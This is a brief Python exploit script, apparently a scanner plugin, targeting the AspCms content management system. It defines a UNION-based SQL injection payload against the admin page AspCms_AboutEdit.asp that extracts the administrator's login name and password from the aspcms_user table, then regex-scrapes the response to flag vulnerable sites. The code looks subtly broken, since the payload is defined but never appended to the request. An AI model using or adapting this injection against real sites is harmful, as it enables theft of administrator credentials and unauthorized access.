# coding:utf-8
import requests
import re

class Exploit:

    query = '/admin/_content/_About/AspCms_AboutEdit.asp?id='
    payload = '1%20and%201=2%20union%20select%201,2,3,4,5,loginname,7,8,9,password,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35%20from%20aspcms_user%20where%20userid=1'

    def attack(self, url):
        response = requests.get(url+self.query)
        if response.status_code == 200:
            m = re.search(r'name="SortName" value="(.*?)"[\s\S]*?value="(.*?)"', response.content)

            if m:
                return url